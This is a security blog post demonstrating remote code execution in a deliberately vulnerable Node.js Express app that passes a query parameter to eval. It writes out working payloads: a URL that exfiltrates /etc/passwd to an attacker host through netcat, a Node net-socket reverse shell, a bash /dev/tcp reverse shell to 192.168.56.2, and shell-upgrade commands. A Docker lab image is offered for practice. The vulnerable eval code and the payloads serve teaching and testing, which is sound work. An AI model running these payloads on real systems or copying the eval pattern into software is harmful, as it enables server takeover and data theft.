---
title: "Nodejs RCE and a simple reverse shell"
date: 2016-08-23
categories:
- nodejs
- rce
- poc
tags:
- poc

thumbnailImagePosition: left
thumbnailImage: /img/nodejs-rce-and-a-simple-reverse-shell/1.png
---

An example proof of concept to show bad programming practice in nodejs that allows for user supplied data to be executed on the server.

<!--more-->

## Introduction

While reading through the blog post on a [RCE on demo.paypal.com by @artsploit](http://artsploit.blogspot.in/2016/08/pprce2.html), I started to wonder what would be the simplest nodejs app that I could use to demo a RCE. Looking at the hello world tutorials online, I came up with the following simple app that takes a user input via the URL as a GET parameter and passes it to eval, which is obviously a bad programming practice.

## The code

Obviously, the functionality of this app is questionable, but in the real world Node applications will use `eval` to [leverage JavaScript's eval but with sandboxing](https://www.npmjs.com/package/eval) amongst other things.

```
var express = require('express');
var app = express();
app.get('/', function (req, res) {
    res.send('Hello ' + eval(req.query.q));
    console.log(req.query.q);
});
app.listen(8080, function () {
    console.log('Example app listening on port 8080!');
});
```

To access the app, navigate to http://host-ip:8080/?q='Test'.

## How do we exploit this

The exploit can be triggered using the q parameter. Node provides the `child_process` module and the `eval` can be used to execute the exploit. A quick demo can consist of the following steps:

1. Run `nc -lvp 80` on a server you control and whose port 80 is reachable from the server running the Node app.
2. Navigate to `http://host-ip:8080/?q=require('child_process').exec('cat+/etc/passwd+|+nc+attacker-ip+80')`


This will send the contents of `/etc/passwd` to the attacker's nc instance. If the node server has the traditional `nc` installed (instead of the openbsd alternative) you can even use `-e /bin/bash` to return a proper shell from the node server.

![](/img/nodejs-rce-and-a-simple-reverse-shell/1.png)

### Getting a reverse shell

As the case is with default installations the netcat that attackers love may not always be present on vulnerable machines. In such cases, the net module can be used to redirect the stdin, stdout and stderr streams to and from the attacker's machine. The exploit code in such a case would be

```
var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(80, "attacker-ip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```

To execute this, use the following steps:
1. Run nc -lvp 80 on a server you control and whose port 80 is reachable from the server running the Node app. Again, this would act as your shell listener/collector.
2. Navigate to the following URL

```
http://host-ip:8080/?q=var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attacker-ip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
```

![](/img/nodejs-rce-and-a-simple-reverse-shell/2.png)

You can then use `/bin/bash -i` or `python -c 'import pty; pty.spawn("/bin/bash")'` to get a proper TTY shell ([See more techniques here.](http://netsec.ws/?p=337)).

**Update:** A simpler reverse shell below

### A simpler/alternate reverse shell

```
require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.2/80 0>%261"')
```

According to `https://github.com/bahamas10/node-exec`
> For backwards compatibility with child_process.exec, it is also possible to pass a string to exec. The string will automatically be converted to ['/bin/sh', '-c', '{string}'], which will cause the string to be parsed on the shell.

It appears that `/bin/sh` has some trouble dealing with multiple file descriptors, we can simply ask `/bin/sh` to spawn a new `/bin/bash` and use the new `/bin/bash` to execute our standard reverse shellcode. Whew!

## Get this to play with

I created a docker image with Node and the app installed so that this is easier to test and play with. You can setup this PoC using the following steps:

1. Install docker on your host machine. This is the standard reference - https://docs.docker.com/engine/installation/ 
2. Once docker is setup, run the command `docker run -p 8080:8080 -d appsecco/node-simple-rce`
3. Navigate to the app by going to: `http://localhost:8080/?q='Test'`


The code is [available on Github if you want to play with this locally](https://github.com/appsecco/vulnerable-apps/tree/master/node-simple-rce).

Happy Hacking!

---